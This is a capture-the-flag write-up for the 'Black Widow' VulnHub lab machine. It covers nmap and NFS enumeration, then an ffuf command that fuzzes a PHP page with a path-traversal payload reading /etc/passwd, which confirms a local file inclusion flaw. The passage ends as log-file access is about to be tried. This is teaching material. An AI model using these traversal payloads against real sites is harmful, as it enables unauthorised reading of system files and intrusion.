---
layout: default
title : muzec - Black Widow Writeup
---


### Enumeration With Nmap

We always start with an nmap scan.....

```Nmap -sC -sV -p- -oA nmap <Target-IP>```

```
# Nmap 7.91 scan initiated Thu Sep 30 08:52:02 2021 as: nmap -sC -sV -p- -oA nmap 172.16.139.233
Nmap scan report for 172.16.139.233
Host is up (0.00059s latency).
Not shown: 65526 closed ports
PORT      STATE SERVICE    VERSION
22/tcp    open  ssh        OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 f8:3b:7c:ca:c2:f6:5a:a6:0e:3f:f9:cf:1b:a9:dd:1e (RSA)
|   256 04:31:5a:34:d4:9b:14:71:a0:0f:22:78:2d:f3:b6:f6 (ECDSA)
|_  256 4e:42:8e:69:b7:90:e8:27:68:df:68:8a:83:a7:87:9c (ED25519)
80/tcp    open  http       Apache httpd 2.4.38 ((Debian))
|_http-server-header: Apache/2.4.38 (Debian)
|_http-title: Site doesn't have a title (text/html).
111/tcp   open  rpcbind    2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100003  3           2049/udp   nfs
|   100003  3           2049/udp6  nfs
|   100003  3,4         2049/tcp   nfs
|   100003  3,4         2049/tcp6  nfs
|   100005  1,2,3      37755/udp   mountd
|   100005  1,2,3      43495/tcp6  mountd
|   100005  1,2,3      46913/tcp   mountd
|   100005  1,2,3      52357/udp6  mountd
|   100021  1,3,4      34843/udp   nlockmgr
|   100021  1,3,4      37303/tcp6  nlockmgr
|   100021  1,3,4      43539/tcp   nlockmgr
|   100021  1,3,4      50172/udp6  nlockmgr
|   100227  3           2049/tcp   nfs_acl
|   100227  3           2049/tcp6  nfs_acl
|   100227  3           2049/udp   nfs_acl
|_  100227  3           2049/udp6  nfs_acl
2049/tcp  open  nfs_acl    3 (RPC #100227)
3128/tcp  open  http-proxy Squid http proxy 4.6
|_http-server-header: squid/4.6
|_http-title: ERROR: The requested URL could not be retrieved
38547/tcp open  mountd     1-3 (RPC #100005)
43539/tcp open  nlockmgr   1-4 (RPC #100021)
46913/tcp open  mountd     1-3 (RPC #100005)
57743/tcp open  mountd     1-3 (RPC #100005)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Thu Sep 30 08:52:17 2021 -- 1 IP address (1 host up) scanned in 15.22 seconds
```

Some interesting ports we have 22,80,2049 and 3128 found it cool really let start digging.


### PORT 2049

```
┌──(muzec㉿Muzec-Security)-[~/Documents/Vulnhubs/widow]
└─$ showmount -e 172.16.139.233 
```

![image](https://user-images.githubusercontent.com/69868171/135458590-57b92c38-82cc-4943-964b-61b409e0da67.png)

We have nothing i also check the squid proxy port and nothing also time to dig into the HTTP port 80.

![image](https://user-images.githubusercontent.com/69868171/135458899-0d26e251-bb39-4cf6-ad50-737ff7066b1a.png)

We have a directory `company` let try to access it.

![image](https://user-images.githubusercontent.com/69868171/135459001-44792c9c-5cd9-4b74-a5a3-0d6faf3578aa.png)


Let try to dig around.

![image](https://user-images.githubusercontent.com/69868171/135459185-2a0fad1b-3262-4974-9d1e-02e8608cb3de.png)

Click on the `Get Started` page we are redircted to a page note:- we need to add our IP and blackwidow to our `/etc/hosts` file and we should be good to go.


### FUZZING FOR PARAMETERS

Since we have nothing interesting the page and we know the `started` page is having a `php` extension at the back let try to fuzzer for parameter maybe it vulnerable to LFI.


![image](https://user-images.githubusercontent.com/69868171/135459971-e72429f9-4893-4c09-a8a8-74c3aa0ade12.png)

We keep getting errors so let add the size to the `ffuf` commands.


```
┌──(muzec㉿Muzec-Security)-[~/Documents/Vulnhubs/widow]
└─$ ffuf -c -ic -r -u 'http://blackwidow/company/started.php?FUZZ=../../../../../../../../../../../../../../etc/passwd' -w /usr/share/seclists/Discovery/Web-Content/common.txt -fs 42271

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.3.1 Kali Exclusive <3
________________________________________________

 :: Method           : GET
 :: URL              : http://blackwidow/company/started.php?FUZZ=../../../../../../../../../../../../../../etc/passwd
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/common.txt
 :: Follow redirects : true
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405
 :: Filter           : Response size: 42271
________________________________________________

file                    [Status: 200, Size: 1582, Words: 15, Lines: 30]
:: Progress: [4681/4681] :: Job [1/1] :: 555 req/sec :: Duration: [0:00:07] :: Errors: 0 ::
```


Boom we have a parameter let test it.


![image](https://user-images.githubusercontent.com/69868171/135460945-f7b4efe5-deef-45d5-b628-008f645c883e.png)

We have LFI now let try to check if we can access the log file.

